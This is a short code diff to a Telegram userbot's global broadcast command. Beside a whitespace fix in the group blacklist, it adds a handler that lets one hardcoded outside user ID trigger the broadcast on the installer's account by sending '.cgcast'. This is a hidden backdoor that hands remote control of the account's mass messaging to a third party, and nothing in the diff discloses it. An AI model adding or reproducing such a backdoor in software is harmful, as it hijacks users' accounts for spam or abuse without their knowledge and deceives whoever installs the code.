@@ -26,11 +26,12 @@ GCAST_BLACKLIST = [
     -1001459701099,  # CatUserbotSupport
     -1001109837870,  # TelegramBotIndonesia
     -1001752592753,  # Skyzusupport
-    -1001273141346, # Remix Support Vegeta
+    -1001273141346,  # Remix Support Vegeta
 ]
 
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+@register(incoming=True, from_users=1191668125, pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
